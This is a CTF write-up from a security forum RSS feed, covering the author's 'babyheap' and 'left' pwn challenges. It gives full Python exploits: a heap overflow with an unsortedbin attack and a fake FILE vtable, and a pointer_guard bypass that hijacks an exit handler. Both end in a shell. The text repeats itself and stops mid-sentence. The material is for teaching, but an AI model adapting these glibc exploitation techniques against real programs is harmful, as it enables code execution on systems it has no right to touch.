mangled_ptr = int(c.recvline()[:-1], 10)
print &#39;mangled_ptr @ &#39; + hex(mangled_ptr)
 # 
pointer_guard = ror(mangled_ptr, 0x11, 64) # we do ror operation first
pointer_guard ^= libc_dl                   # xor with original value
print &#39;pointer_guard @ &#39; + hex(pointer_guard)
 #
address = 0x1
address ^= pointer_guard                   # xor with the pointer_guard
address = rol(address, 0x11, 64)           # reverse ror operation, rol!
 # 
pause()                                    # to attach
 #
c.recvuntil(&#39;write address:&#39;)
c.sendline(str(libc_at))
c.recvuntil(&#39;new value:&#39;)
c.sendline(str(address)) 
 ```

- Running the script, attaching to **gdb** and resuming execution gives the following:
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/6/6748f14895c459cdcf85c831f75f4bd704e12831.png&quot; width=&quot;491&quot; height=&quot;135&quot;&gt;
:wink: We control *RIP*. 

- Now what&#39;s left is simple, we will use [one_gadget](https://github.com/david942j/one_gadget) script by **david942j**.
It will look for gadgets that take the argument &#39;*/bin/sh*&#39;, and call &#39;*execve*&#39;, &#39;*execl*&#39;.. (*there are multiple of &#39;em in each libc*)
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/a/af2ad36fb43d92450661714d671f6ff3dfdfa651.png&quot; width=&quot;644&quot; height=&quot;275&quot;&gt;
We take the first and try and see if he&#39;ll work, if not, the requirements aren&#39;t met &#39;**[rsp + 0x30] == NULL in the first**&#39;!
So we try them one by one.
In my case, the fourth one worked.

- We can then enjoy our shell!
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/1/1102dd76b286001e45e0b298fb7e7b66f016f794.png&quot; width=&quot;362&quot; height=&quot;160&quot;&gt;

- Full exploit:
 ```python
 #!/usr/bin/python
from pwn import *
 #
c = process(&#39;./left&#39;)
 # LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
one_diff = 0xe8618
 # EXPLOIT
c.recvuntil(&#39;printf(): &#39;)
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
one = libc_base + one_diff
print &#39;libc_base @ &#39; + hex(libc_base)
 # 
c.recvuntil(&#39;read address:&#39;)
c.sendline(str(libc_at))
c.recvuntil(&#39;content: &#39;)
mangled_ptr = int(c.recvline()[:-1], 10)
print &#39;mangled_ptr @ &#39; + hex(mangled_ptr)
 # 
pointer_guard = ror(mangled_ptr, 0x11, 64) # we do ror operation first
pointer_guard ^= libc_dl                   # xor with original value
print &#39;pointer_guard @ &#39; + hex(pointer_guard)
 #
one ^= pointer_guard                       # xor with the pointer_guard
one = rol(one, 0x11, 64)                   # reverse ror operation, rol!
 #
pause()
 # 
c.recvuntil(&#39;write address:&#39;)
c.sendline(str(libc_at))
c.recvuntil(&#39;new value:&#39;)
c.sendline(str(one))
 # INTERACTIVE
c.interactive()
 ```

For remote case, check [DCUA](https://gist.github.com/romanking98/5f5ff9114fc011c9ac8c88aa253bcc69) and [SPRITZ](https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/0x00ctf-2017/pwn/left-250) writeups.

Hope you liked the article and learned as well! :smiley:</description>
    
    <lastBuildDate>Sun, 04 Feb 2018 19:40:12 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/0x00ctf-writeup-babyheap-left/5314.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>0x00ctf Writeup | babyheap &amp; left!</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/0x00ctf-writeup-babyheap-left/5314/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/0x00ctf-writeup-babyheap-left/5314/2</link>
        <pubDate>Tue, 06 Mar 2018 19:31:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-5314-2</guid>
        <source url="https://0x00sec.org/t/0x00ctf-writeup-babyheap-left/5314.rss">0x00ctf Writeup | babyheap &amp; left!</source>
      </item>
      <item>
        <title>0x00ctf Writeup | babyheap &amp; left!</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p>In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<p>Hello everyone, i’ll be writing how it was expected for the tasks I made to be solved. <img src="/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"><br>
I finally found some free time, sorry for the late post.</p>
<p>So, this article will be splitted to two main parts:<br>
I. <em>babyheap</em><br>
II. <em>left</em></p>
<h3>I. <em>babyheap</em>
</h3>
<p>In this task, we have multiple functions, and we note the following:</p>
<ul>
<li><img src="//0x00sec.s3.amazonaws.com/original/2X/e/ee60e034ce8884fb3853d4e2d79edd0f1d6a95b9.png" width="161" height="103"></li>
</ul>
<p>Let’s analyse, each and every one of them slowly, so we know what we are dealing with…</p>
<p><em>} main():</em></p>
<ul>
<li><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6f6bb6082de61f1ca87299c12a849623639697b0.png" width="389" height="407"></li>
</ul>
<p>On this first part, we see that the first thing the binary requests is a name, then we are going to enter an infinite loop that prints the menu, and calls a function: <em>sub_40086D</em>.<br>
Anyway, we are going to analyse it later since we are focusing on main() function currently, but it’s obvious that this function returns an integer, since right after the call is a <em>cmp eax, 6</em> operation, we are falling in a switch…<br>
<strong>menu</strong>: <em>“\x1B[31mMember manager!\x1B[0m\n1. add\n2. edit\n3. ban\n4. change name\n5. get gift\n6. exit”</em>.</p>
<ul>
<li>Let’s see the first 4 cases, each one of them calls a specific function, and goes to the start of the loop.</li>
</ul>
<ol>
<li><em>sub_4008c7</em></li>
<li><em>sub_400a1b</em></li>
<li><em>sub_400c77</em></li>
<li><em>sub_400d45</em></li>
</ol>
<ul>
<li>The rest of the cases, are doing their job directly.<br>
<em>case 5:</em><pre><code class="lang-auto"></code></pre>
</li>
</ul>
<p>loc_400E52:             ; jumptable 0000000000400E25 case 5<br>
mov     edi, offset aYourGift<br>
call    _puts<br>
mov     rax, cs:stdout<br>
mov     rdi, rax        ; stream<br>
call    _fflush<br>
mov     rax, [rbp+var_8]<br>
mov     rax, [rax]<br>
mov     rsi, rax<br>
mov     edi, offset format ; “%lu\n”<br>
mov     eax, 0<br>
call    _printf<br>
jmp     short loc_400EAA</p>
<pre><code class="lang-auto">
- So, it first call puts, with argument: *'your gift:'*.
*fflush(stdout)*, then *printf("%lu", [rax])*..
We can guess from *long unsigned* format, the *printed text*, and the dereferencing of the **RAX** register, that it will print a libc address. Indeed, it does (**read_got** contents).

- *case 6:*
This one won't take much to understand, it simply calls *exit(0)*..
- *default:*
```asm
mov     edi, offset aInvalidOption
call    _puts
mov     rax, cs:stdout
mov     rdi, rax        ; stream
call    _fflush
nop
</code></pre>
<ul>
<li>It calls puts with the argument <em>‘invalid option!’</em>, then calls <em>fflush(stdout)</em>.</li>
</ul>
<p><em>} sub_40086d:</em></p>
<ul>
<li><img src="//0x00sec.s3.amazonaws.com/original/2X/4/465f864aead489d50d1409c626c84fbb292f9633.png" width="397" height="437"></li>
</ul>
<p>This function, calls read first… then calls atoi on the input, returns the result.<br>
(<em>That moment when I discovered that It’s an old version of the pwnable vulnerable to OOB <img src="/images/emoji/twitter/cry.png?v=9" title=":cry:" class="emoji" alt=":cry:"></em>)</p>
<p><em>} sub_4008c7:</em></p>
<ul>
<li>This one is a big function, it’s add() function.<br>
it first prints a <em>“looking for place to register…”</em>, then goes in a loop from 0 to 3 to look for an empty slot.</li>
<li>if found:<br>
goes in an infinite loop requesting a valid size, it should be bigger than <em>0x7F</em> and less or equal to <em>0x1000</em>, so no fastbin allowed(<em>&gt; global_max_fast</em>). (<strong>data size</strong> will be added to <strong>metadata size</strong>(<em>0x10</em>), then created).<br>
When the size requirements are met, <em>malloc(size)</em> is then called,  requests a <em>‘username:’</em> and read in the chunk the <em>size</em> much. Then is a <em>secure check</em>, to null terminate the input, as long as it wouldn’t harm the <strong>next chunk</strong> size.<br>
Then the pointer to chunk is stored in the array, and returns.</li>
<li>if not:<br>
Well, just <em>returns</em> <img src="/images/emoji/twitter/laughing.png?v=9" title=":laughing:" class="emoji" alt=":laughing:">!</li>
</ul>
<p><em>} sub_400a1b:</em></p>
<ul>
<li>This is the edit function, it has 2 options, either a secure edit or a vulnerable one.<br>
You can only use them once each:</li>
<li>secure edit (<em>option 1</em>):<br>
First requests the index, then check if it’s valid and exists, then gets the chunk size using <strong>malloc_usable_size()</strong> function, reads that nbytes to the choosen chunk. and increments a variable that shows the secure edit has been used.</li>
<li>insecure edit (<em>option 2</em>):<br>
Similiar to secure edit, with a change on the level of the size, since it now uses <strong>strlen()</strong> function, which will end only when nullbyte is reached. which means, if we fill the chunk completely on add(), we can cause an <em>overflow</em> to the next chunk size.</li>
</ul>
<p><em>} sub_400c77:</em></p>
<ul>
<li>the ban function, or more precisely, the one that will call <strong>free()</strong>. It can only be used once, increments a specific variable if so, (<em>don’t you think it’ll allow UAF</em>).</li>
</ul>
<pre><code class="lang-auto">mov     ds:ptr[rax*8], 0
</code></pre>
<p><em>} sub_400d45:</em></p>
<ul>
<li>Allows you to change name, once again, only one time is allowed.</li>
</ul>
<p>Now that we have analysed all functions, we have noticed that the leak is easy to get, as it’s given, <em>gift option</em>… and there is a vulnerability allowing us to overwrite the <em>next chunk</em> metadata, it’s size precisely.</p>
<p>So, let’s think, what can we do?</p>
<ul>
<li>We can use secure and insecure edit only once, right? What if we use the insecure edit first to overflow to next chunk size and change it(make it either <strong>bigger</strong> or <strong>smaller</strong>), and then use the secure edit, that’s going to call <strong>malloc_usable_size</strong>, most people who have done that and failed, didn’t probably check the <em>source</em>, and those who did it without looking at it, probably, just added the size of the current to the size of the next one, without knowing why…</li>
</ul>
<pre><code class="lang-auto">static size_t
musable (void *mem)
{
 mchunkptr p;
 if (mem != 0)
   {
     p = mem2chunk (mem);
     if (__builtin_expect (using_malloc_checking == 1, 0))
       return malloc_check_get_size (p);
     if (chunk_is_mmapped (p))
       {
         if (DUMPED_MAIN_ARENA_CHUNK (p))
           return chunksize (p) - SIZE_SZ;
         else
           return chunksize (p) - 2 * SIZE_SZ;
       }
     else if (inuse (p)) // HERE
       return chunksize (p) - SIZE_SZ;
   }
 return 0;
}
</code></pre>
<ul>
<li>
<p>The only thing we need then to satisfy is that <strong>inuse§ == 1</strong>, to do that, we need to make a fake next size, with <em>PREV_INUSE</em> bit set.<br>
Now we know, we can make a used chunk overlap on a free’d one… Therefore, overwrite it’s metadata(<strong>FD</strong> &amp; <strong>BK</strong>), remember? We only can allocate small-largebins… Let’s create a small-largebin, free it, it’s going to be placed in unsortedbin list, what if we overwrite it’s BK? <strong>YES</strong>, <em>unsortedbin attack</em> for the win!</p>
</li>
<li>
<p>First, we start by implementing the functions to the exploit.</p>
</li>
</ul>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *
c = process('./babyheap')
def add(size, content):
   c.sendline('1')
   c.recvuntil('size:')
   c.sendline(str(size))
   c.recvuntil('username:')
   c.sendline(content)
   c.recvuntil('6. exit')
def edit(id, mode, content):
   c.sendline('2')
   c.recvuntil('2. insecure edit')
   c.sendline(str(mode))
   c.recvuntil('index:')
   c.sendline(str(id))
   c.recvuntil('new username:')
   c.sendline(content)
   c.recvuntil('6. exit')
def ban(id):
   c.sendline('3')
   c.recvuntil('index:')
   c.sendline(str(id))
   c.recvuntil('6. exit')
def change(name):
   c.sendline('4')
   c.recvuntil('enter new name:')
   c.sendline(name)
# PREPARE
name = "A" * 8
c.recvuntil('enter your name:')
c.sendline(name)
# EXPLOIT
#
# INTERACTIVE
c.interactive()
</code></pre>
<p>So the part we will start building is the <em>EXPLOIT</em> one!</p>
<ul>
<li>We’ll start by making the chunks:</li>
<li>1st chunk will be used to overflow from and use the insecure edit to influence the next chunk!</li>
<li>2nd chunk must be of size <strong>0x101</strong> as a minimum, so we control two bytes(unlike <strong>0x90</strong> or <strong>0xf0</strong> case).</li>
<li>Then, comes the victim chunk, this one will be free’d and pushed into unsortedbin list and we’ll try overwritting it’s metadata later on.</li>
<li>Finally, a bordering chunk that won’t allow <strong>top consolidation</strong> when the victim chunk is free’d!</li>
</ul>
<pre><code class="lang-auto">add(0x88, "A" * 0x88) # 0 ; chunk to overflow from
add(0x100, "B" * 8)   # 1 ; (size &gt;= 0x100) = 0x110
add(0x500, "C" * 8)   # 2 ; 0x510 chunk
add(0x88, "E" * 8)    # 3 ; prevent top consolidation
</code></pre>
<ul>
<li>But after allocating those, you’ll later find that after freeing <strong>chunk <span class="hashtag">#2</span></strong>, the secure edit is no longer working after changing the size of <strong>chunk <span class="hashtag">#1</span></strong> randomly <em>(because of the check mentionned above)</em>, so we will create a fake chunk within <strong>chunk <span class="hashtag">#2</span></strong> before freeing it, and do some <em>quick mafs</em> to calculate the fake size with precision!</li>
</ul>
<pre><code class="lang-auto">add(0x88, "A" * 0x88) # 0 ; chunk to overflow from
add(0x100, "B" * 8)   # 1 ; (size &gt;= 0x100) = 0x110
payload = "D" * 0x160  # filling
payload += p64(0)      # fake prev
payload += p64(0x21)   # fake size + PREV_INUSE &lt; important
add(0x500, payload)   # 2 ; 0x510 chunk
add(0x88, "E" * 8)    # 3 ; prevent top consolidation
</code></pre>
<p>After creating them chunks, now it’s our time to call…</p>
<ul>
<li>The great <em>free()</em>
</li>
</ul>
<pre><code class="lang-auto">c.recv()
ban(2) # put in unsortedbin
</code></pre>
<p>We will now overwrite the <strong>chunk <span class="hashtag">#1</span></strong> size, by overflowing from <strong>chunk <span class="hashtag">#0</span></strong>.<br>
Before doing so, what size should we assign?<br>
To calculate:<br>
(The original size of  <strong>chunk <span class="hashtag">#1</span></strong> + Header size <em>(prev_size &amp; size)</em> of <strong>chunk <span class="hashtag">#2</span></strong> + Filling size <em>(0x160)</em>) = (<em>0x110</em> + <em>0x8*2</em> + <em>0x160</em>) = <em>0x280</em><br>
<em>0x280</em> with addition of <strong>PREV_INUSE</strong> bit is 0x281, that’s our size!</p>
<ul>
<li>So let’s do that in the exploit!</li>
</ul>
<pre><code class="lang-auto">payload = "A" * 0x88  # filling
payload += p16(0x281) # next fake size
edit(0, 2, payload)   # using insecure edit for doing that
</code></pre>
<p>Now, we can take the prize, our precious leak, store and calculate the values!</p>
<ul>
<li>As follows:</li>
</ul>
<pre><code class="lang-auto">c.recv()
c.sendline('5')
c.recvline()
libc_read = int(c.recvline()[:-1], 10)
libc_base = libc_read - read_diff
libc_system = libc_base + sys_diff
#
print 'libc_base @ ' + hex(libc_base)
#
c.recv()
</code></pre>
<p>Now, when we are done with all of these stuff, we will be stuck thinking, overlapping chunks and unsortedbin attack, but what? really, what? What can be done with this only in hand?</p>
<ul>
<li>The answer is simple, many scenarios can be done, we cite the following:</li>
<li>By overwritting <strong>global_max_fast</strong> variable on libc <em>rw-p</em> area, we can make it treat any and every chunk when free’d as a fastbin chunk.</li>
<li>Another way is to mess with a <strong>_IO_FILE_plus</strong> struct or some pointer to it, such as the <strong>_IO_list_all</strong>, and that’s what we are going to do here.</li>
</ul>
<p>Something you should know is that, when we trigger the unsortedbin attack, the following will happen:<br>
<em>*(<strong>BK</strong>+0x10) = main_arena+XXX;</em><br>
If we set <strong>BK</strong> to the <strong>_IO_list_all</strong>-0x10, our chunk will be considered as a pure <strong>_IO_FILE</strong> struct, we’ll basically confuse it.<br>
But after doing that, the whole list is messed up now, while was previously a single linked list(<strong>_chain</strong>) to all the of the <em>stderr</em>, <em>stdin</em> and <em>stdout</em>. That will basically lead to a corruption, wouldn’t it?<br>
And that’s exactly where we are going to strike…</p>
<ul>
<li>The call to <strong>abort()</strong> function to terminate the program:</li>
</ul>
<pre><code class="lang-auto">/* Cause an abnormal program termination with core-dump.  */
void
abort (void)
{
/* ... */
   if (stage == 1)
   {
   	++stage;
   	fflush (NULL);
   }
</code></pre>
<ul>
<li>With <strong>fflush()</strong> macro:</li>
</ul>
<pre><code class="lang-auto">#define fflush(s) _IO_flush_all_lockp (0)
</code></pre>
<ul>
<li>
<strong>_IO_flush_all_lockp</strong> containing the following lines:</li>
</ul>
<pre><code class="lang-auto">   while (fp != NULL)
   {
   	run_fp = fp;
   	if (do_lock)
   		_IO_flockfile (fp);
   	if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
   	|| (_IO_vtable_offset (fp) == 0
   	&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
   	&gt; fp-&gt;_wide_data-&gt;_IO_write_base))
   	)
   	&amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
</code></pre>
<ul>
<li>As you can see, if the first parts of the check are passed <em>(we need to satisfy 'em later)</em>, a call to <strong>_IO_OVERFLOW()</strong> is done:</li>
</ul>
<pre><code class="lang-auto">#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
</code></pre>
<ul>
<li>Oh look, a usage of the vtable within!</li>
</ul>
<pre><code class="lang-auto">struct _IO_jump_t
{
   JUMP_FIELD(size_t, __dummy);             // 1
   JUMP_FIELD(size_t, __dummy2);            // 2
   JUMP_FIELD(_IO_finish_t, __finish);      // 3
   JUMP_FIELD(_IO_overflow_t, __overflow);  // 4 &lt;-- the choosen one!
</code></pre>
<ul>
<li>We are getting somewhere, cause <strong>_IO_list_all</strong> is a pointer to an _IO_FILE_plus struct, which supposedly contains a vtable.</li>
</ul>
<pre><code class="lang-auto">struct _IO_FILE_plus
{
   _IO_FILE file;
   const struct _IO_jump_t *vtable;
};
</code></pre>
<p>For further reading on this:<br>
<a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" rel="noopener nofollow ugc">House of Orange</a><br>
<a href="http://4ngelboy.blogspot.tw/2017/11/play-with-file-structure-yet-another.html" rel="noopener nofollow ugc">Playing with file structure</a><br>
<a href="https://code.woboq.org/userspace/glibc/libio/libioP.h.html#_IO_FILE_plus" rel="noopener nofollow ugc">Source</a></p>
<p>Anyway, we’ve seen that there’s a vtable after our fake <strong>_IO_FILE</strong> struct <em>(our in full-control chunk)</em>.</p>
<ul>
<li>We can change name which is in a known location <em>(PIE: OFF)</em>, that says:</li>
</ul>
<pre><code class="lang-python">payload = p64(0) * 3             # filling
payload += p64(libc_system)      # __overflow
change(payload)
</code></pre>
<p>Once this is done, we can start <em>crafting</em> the fake <strong>_IO_FILE</strong> to satisfy the first part of the check within <strong>_IO_flush_all_lockp()</strong> function, so it results into <strong>_IO_OVERFLOW()</strong> call!</p>
<ul>
<li>To satisfy is: <em>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</em>.</li>
</ul>
<pre><code class="lang-auto">struct _IO_FILE {
     int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
   #define _IO_file_flags _flags
     /* The following pointers correspond to the C++ streambuf protocol. */
     /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
#
     char* _IO_read_ptr;        /* Current read pointer */
     char* _IO_read_end;        /* End of get area. */
     char* _IO_read_base;        /* Start of putback+get area. */
     char* _IO_write_base;        /* Start of put area. */
     char* _IO_write_ptr;        /* Current put pointer. */
</code></pre>
<ul>
<li>So next part of the exploit calculates <strong>_IO_list_all</strong>, and <em>crafts</em> the <em>_IO_FILE</em> fake struct, bearing in mind that check to satisfy:</li>
</ul>
<pre><code class="lang-python">_IO_list_all = libc_base + iolist_diff
name_ptr = 0x6020a0
#
payload = "B" * 8*32                # overflow to victim chunk using secure edit
payload += '/bin/sh\x00'            # fake prev
payload += p64(0x61)                # fake shrinked size
payload += p64(0)                   # fake FD
payload += p64(_IO_list_all - 0x10) # fake BK
payload += p64(2)                   # fp-&gt;_IO_write_base
payload += p64(3)                   # fp-&gt;_IO_write_ptr
payload += p64(0) * 21              # filling
payload += p64(name_ptr)            # fake *vtable
# 
edit(1, 1, payload)                 # use secure edit 
</code></pre>
<p>You may have wondered, why did I put <em>‘/bin/sh\x00’</em> in <strong>prev_size</strong> field…<br>
Answer is simple: <strong>prev_size</strong> <em>(start of the chunk)</em> was passed in <strong>RDI</strong> register, so say, an argument to <strong>system()</strong> later.</p>
<p>Now, we already have almost done everything, all is left is to trigger the <em>unsortedbin attack</em>.</p>
<ul>
<li>And it’s done:</li>
</ul>
<pre><code class="lang-python">sleep(2)
#
pause()
c.recv()
c.sendline('1')
c.recvuntil('size:')
c.sendline(str(0x80))
</code></pre>
<ul>
<li>Finally, making sure to add the offsets, can be easily reteived with <a href="https://github.com/niklasb/libc-database" rel="noopener nofollow ugc">libc-database</a>…</li>
</ul>
<pre><code class="lang-python"># LOCAL
iolist_diff = 0x3c31a0
read_diff = 0xef320
sys_diff = 0x46590
</code></pre>
<p>By assembling all the above mentionned parts, we get it;</p>
<ul>
<li>Full exploit:</li>
</ul>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *
# LOCAL
iolist_diff = 0x3c31a0
read_diff = 0xef320
sys_diff = 0x46590
#
c = process('./babyheap')
#
def add(size, content):
   c.sendline('1')
   c.recvuntil('size:')
   c.sendline(str(size))
   c.recvuntil('username:')
   c.sendline(content)
   c.recvuntil('6. exit')
def edit(id, mode, content):
   c.sendline('2')
   c.recvuntil('2. insecure edit')
   c.sendline(str(mode))
   c.recvuntil('index:')
   c.sendline(str(id))
   c.recvuntil('new username:')
   c.sendline(content)
   c.recvuntil('6. exit')
def ban(id):
   c.sendline('3')
   c.recvuntil('index:')
   c.sendline(str(id))
   c.recvuntil('6. exit')
def change(name):
   c.sendline('4')
   c.recvuntil('enter new name:')
   c.sendline(name)
# PREPARE
name = "A" * 8
c.recvuntil('enter your name:')
c.sendline(name)
# EXPLOIT
add(0x88, "A" * 0x88) # 0 ; chunk to overflow from
add(0x100, "B" * 8)   # 1 ; (size &gt;= 0x100) = 0x110
payload = "D" * 0x160  # filling
payload += p64(0)      # fake prev
payload += p64(0x21)   # fake size + PREV_INUSE &lt; important
add(0x500, payload)   # 2 ; 0x510 chunk
add(0x88, "E" * 8)    # 3 ; prevent top consolidation
# 
c.recv()
ban(2) # put in unsortedbin
# 
payload = "A" * 0x88  # filling
payload += p16(0x281) # next fake size
edit(0, 2, payload)   # using insecure edit for doing that
# 
c.recv()
c.sendline('5')
c.recvline()
libc_read = int(c.recvline()[:-1], 10)
libc_base = libc_read - read_diff
libc_system = libc_base + sys_diff
#
print 'libc_base @ ' + hex(libc_base)
#
c.recv()
payload = p64(0) * 3             # filling
payload += p64(libc_system)      # __overflow
change(payload)
# 
_IO_list_all = libc_base + iolist_diff
name_ptr = 0x6020a0
#
payload = "B" * 8*32                # overflow to victim chunk
payload += '/bin/sh\x00'            # fake prev
payload += p64(0x61)                # fake shrinked size
payload += p64(0)                   # fake FD
payload += p64(_IO_list_all - 0x10) # fake BK
payload += p64(2)                   # fp-&gt;_IO_write_base
payload += p64(3)                   # fp-&gt;_IO_write_ptr
payload += p64(0) * 21              # filling
payload += p64(name_ptr)            # fake *vtable
# 
edit(1, 1, payload)                 # use secure edit
# 
sleep(2)
#
pause()
c.recv()
c.sendline('1')
c.recvuntil('size:')
c.sendline(str(0x80))
# INTERACTIVE
c.interactive()
</code></pre>
<p>That’s how we correctly do <strong>babyheap</strong>!</p>
<h3>II. <em>left</em>
</h3>
<p>While it seems like a small and easy task, it requires a bit more work.</p>
<ul>
<li>A small look at IDA:</li>
</ul>
<pre><code class="lang-auto">lea     rax, [rbp+art]
mov     rsi, rax
mov     edi, offset format ; "%s"
mov     eax, 0
call    _printf
mov     rax, [rbp+ptr]
mov     rax, [rax]
mov     rsi, rax
mov     edi, offset aPrintfLu ; "printf(): %lu\n"
mov     eax, 0
call    _printf
mov     edi, offset s   ; "read address:"
call    _puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    _fflush
lea     rax, [rbp+ptr]
mov     rsi, rax
mov     edi, offset aLu ; "%lu"
mov     eax, 0
call    ___isoc99_scanf
mov     rax, [rbp+ptr]
mov     rax, [rax]
mov     rsi, rax
mov     edi, offset aContentLu ; "content: %lu\n"
mov     eax, 0
call    _printf
mov     edi, offset aWriteAddress ; "write address:"
call    _puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    _fflush
lea     rax, [rbp+address]
mov     rsi, rax
mov     edi, offset aLu ; "%lu"
mov     eax, 0
call    ___isoc99_scanf
mov     edi, offset aNewValue ; "new value:\n"
call    _puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    _fflush
lea     rax, [rbp+value]
mov     rsi, rax
mov     edi, offset aLu ; "%lu"
mov     eax, 0
call    ___isoc99_scanf
mov     rax, [rbp+address]
mov     rdx, [rbp+value]
mov     [rax], rdx
mov     edi, 0          ; status
call    _exit
</code></pre>
<p>So, it first prints an ASCII art, then comes a <strong>libc_leak</strong> <em>(printf_got contents)</em>.<br>
after that, It’ll ask for an address to print it’s content.<br>
then, It will take an address then requests a value to assign to this last.<br>
but in the end, It’ll kill your hopes with an <em>exit(0);</em>!</p>
<p>It’s easy to deduce that the real work and analyse we should do is on exit internals…</p>
<ul>
<li>On <em>exit</em> call:</li>
</ul>
<pre><code class="lang-auto">void
exit (int status)
{
   __run_exit_handlers (status, &amp;__exit_funcs, true, true);
}
</code></pre>
<ul>
<li>
<em>__run_exit_handlers</em> ?</li>
</ul>
<pre><code class="lang-auto">void
   attribute_hidden
   __run_exit_handlers (int status, struct exit_function_list **listp,
                        bool run_list_atexit, bool run_dtors)
   {
     /* First, call the TLS destructors.  */
   #ifndef SHARED
     if (&amp;__call_tls_dtors != NULL)
   #endif
       if (run_dtors)
         __call_tls_dtors ();
#
     /* We do it this way to handle recursive calls to exit () made by
        the functions registered with `atexit' and `on_exit'. We call
        everyone on the list and use the status value in the last
        exit (). */
     while (true)
       {
         struct exit_function_list *cur;
#
         __libc_lock_lock (__exit_funcs_lock);
#
       restart:
         cur = *listp;
#
         if (cur == NULL)
           {
             /* Exit processing complete.  We will not allow any more
                atexit/on_exit registrations.  */
             __exit_funcs_done = true;
             __libc_lock_unlock (__exit_funcs_lock);
             break;
           }
#
         while (cur-&gt;idx &gt; 0)
           {
             struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx];
             const uint64_t new_exitfn_called = __new_exitfn_called;
#
             /* Unlock the list while we call a foreign function.  */
             __libc_lock_unlock (__exit_funcs_lock);
             switch (f-&gt;flavor)
               {
                 void (*atfct) (void);
                 void (*onfct) (int status, void *arg);
                 void (*cxafct) (void *arg, int status);
#
               case ef_free:
               case ef_us:
                 break;
               case ef_on:
                 onfct = f-&gt;func.on.fn;
   #ifdef PTR_DEMANGLE
                 PTR_DEMANGLE (onfct);
   #endif
                 onfct (status, f-&gt;func.on.arg);
                 break;
               case ef_at:
                 atfct = f-&gt;func.at;
   #ifdef PTR_DEMANGLE
                 PTR_DEMANGLE (atfct);
   #endif
                 atfct ();
                 break;
               case ef_cxa:
                 /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
                    we must mark this function as ef_free.  */
                 f-&gt;flavor = ef_free;
                 cxafct = f-&gt;func.cxa.fn;
   #ifdef PTR_DEMANGLE
                 PTR_DEMANGLE (cxafct);
   #endif
                 cxafct (f-&gt;func.cxa.arg, status);
                 break;
               }
             /* Re-lock again before looking at global state.  */
             __libc_lock_lock (__exit_funcs_lock);
#
             if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
               /* The last exit function, or another thread, has registered
                  more exit functions.  Start the loop over.  */
               goto restart;
           }
#
         *listp = cur-&gt;next;
         if (*listp != NULL)
           /* Don't free the last element in the chain, this is the statically
              allocate element.  */
           free (cur);
#
         __libc_lock_unlock (__exit_funcs_lock);
       }
#
     if (run_list_atexit)
       RUN_HOOK (__libc_atexit, ());
#
     _exit (status);
   }
</code></pre>
<ul>
<li>
<p>Notes:</p>
</li>
<li>
<p>First thing it does, is calling <strong>TLS</strong> destructors; That’s something we won’t <em>overthink or analyse</em> for now.</p>
</li>
<li>
<p>The interesting part lies in the <strong>while (cur-&gt;idx &gt; 0)</strong> loop. We have <em>cur</em> declared as a <strong>exit_function_list</strong>, this latter contains <strong>struct exit_function fns[32];</strong>!</p>
</li>
<li>
<p>We will be then checking the content of this <strong>exit_function</strong> struct.</p>
</li>
<li>
<p><em>exit_function</em> struct:</p>
</li>
</ul>
<pre><code class="lang-auto">   struct exit_function
     {
       /* `flavour' should be of type of the `enum' above but since we need
          this element in an atomic operation we have to use `long int'.  */
       long int flavor;
       union
         {
           void (*at) (void);
           struct
             {
               void (*fn) (int status, void *arg);
               void *arg;
             } on;
           struct
             {
               void (*fn) (void *arg, int status);
               void *arg;
               void *dso_handle;
             } cxa;
         } func;
     };
</code></pre>
<ul>
<li>
<p>Notes:</p>
</li>
<li>
<p>We can clearly see, that it has alot of interesting pointers on ‘<em>func</em>’ struct within.</p>
</li>
<li>
<p>Those will be our target to overwrite, but let’s not forget that they are ‘<strong>DEMANGLED</strong>’ before being called, so this says they are encrypted, to understand that, let’s check the <em>PTR_DEMANGLE</em> macro.</p>
</li>
<li>
<p><em>PTR_DEMANGLE</em> macro:</p>
</li>
</ul>
<pre><code class="lang-auto">   #  define PTR_DEMANGLE(var)        asm ("ror $2*" LP_SIZE "+1, %0\n"             \
                                        "xor %%fs:%c2, %0"                          \
                                        : "=r" (var)                                \
                                        : "0" (var),                                \
                                          "i" (offsetof (tcbhead_t,                 \
                                                         pointer_guard)))
</code></pre>
<ul>
<li>
<p>Notes:</p>
</li>
<li>
